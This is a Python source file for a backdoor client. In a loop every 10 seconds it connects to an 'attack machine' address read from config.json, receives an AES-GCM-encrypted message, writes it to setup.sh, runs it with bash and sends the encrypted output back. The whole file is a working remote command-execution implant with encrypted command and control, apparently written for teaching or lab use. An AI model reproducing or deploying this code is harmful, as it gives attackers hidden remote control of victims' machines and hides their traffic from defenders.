import socket
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import subprocess
import os
import json
import time

# 'localhost' # on same machine
# REACH_IP = 'localhost' # IP of attack machine
# REACH_PORT = 5050
# read in config vars
with open("config.json") as config_f:
    config = json.load(config_f)

REACH_IP = config['REACH_IP']
REACH_PORT = config['REACH_PORT']


def read_key(key_fpath):
    with open(key_fpath, 'r') as key_f:
        hex_key = key_f.read()
        symm_key = bytes.fromhex(hex_key)
    return symm_key

def get_encrypted_msg(symmetric_key, msg: str):
    aesgcm = AESGCM(symmetric_key)
    nonce = os.urandom(12)
    msg_bytes = msg.encode()
    ct = aesgcm.encrypt(nonce=nonce, 
                        data=msg_bytes,
                        associated_data=None)
    return nonce + ct

def decrypt_ct(symmetric_key, msg_ct):
    # we are given nonce + ct
    nonce_length = 12
    nonce = msg_ct[:nonce_length]
    ct = msg_ct[nonce_length:]
    # decrypt
    aesgcm = AESGCM(symmetric_key)
    dec_msg_bytes = aesgcm.decrypt(nonce=nonce,
                data=ct,
                associated_data=None)
    dec_msg = dec_msg_bytes.decode()
    return dec_msg

def send_msg(connection, out_bytes):
    # first send message length
    msg_len = len(out_bytes)
    connection.send(msg_len.to_bytes(8, 'big'))
    # then send message
    connection.send(out_bytes)

def receive_msg(connection, buffer_size=1024):
    # first receive msg length
    len_data = connection.recv(8)
    if not len_data:
        return b"" # no length received
    
    in_msg_len = int.from_bytes(len_data, "big")

    # receive message
    bytes_received = 0
    in_msg_list = []
    while bytes_received < in_msg_len:
        bytes_to_receive = min(buffer_size, in_msg_len - bytes_received)
        msg_part = connection.recv(bytes_to_receive)
        if not msg_part:
            break # connection closed prematurely
        else:
            in_msg_list.append(msg_part)
            bytes_received += len(msg_part)

    full_msg = b"".join(in_msg_list)
    return full_msg

def run_shell_script(script_fname):
    try: 
        # result = subprocess.run(["bash", script_fname], capture_output=True, text=True)
        # return result.stdout + result.stderr
        # For Python 3.6 compatibility
        result = subprocess.run(
            ["bash", script_fname],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True  # This is equivalent to text=True
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def execute_msg(message):
    # TODO: complete so runs the code
    print(f"received:\n{message}\n==")
    # create shell script from the message
    script_fname = "setup.sh"
    with open(script_fname, "w") as f:
        f.write(message)
    # run the shell script
    run_output = run_shell_script(script_fname)
    return run_output

def run_backdoor(ip, port):
    print(f"here -> {ip}:{port}")
    host = ip # socket.gethostname() 
    # create socket
    client_socket = socket.socket() # socket.AF_INET, socket.SOCK_STREAM
    # connect to server (attack machine)
    client_socket.connect((host, port))

    # receive message from server
    in_ct = receive_msg(
        connection=client_socket,
        buffer_size=1024
    )

    # decrypt message
    symm_key = read_key("key.txt")
    message = decrypt_ct(symmetric_key=symm_key,
               msg_ct=in_ct)

    # run code from message
    script_output = execute_msg(message)
    print(f"output:\n{script_output}")
    # send back output from executing code
    enc_output = get_encrypted_msg(
        symmetric_key=symm_key,
        msg=script_output
    )
    # send output to server
    send_msg(
        connection=client_socket,
        out_bytes=enc_output
    )

    # close connection
    client_socket.close()

if __name__ == '__main__':
    while(True):
        # reach out to server
        run_backdoor(REACH_IP, REACH_PORT)
        # sleep for 10 sec
        time.sleep(10)

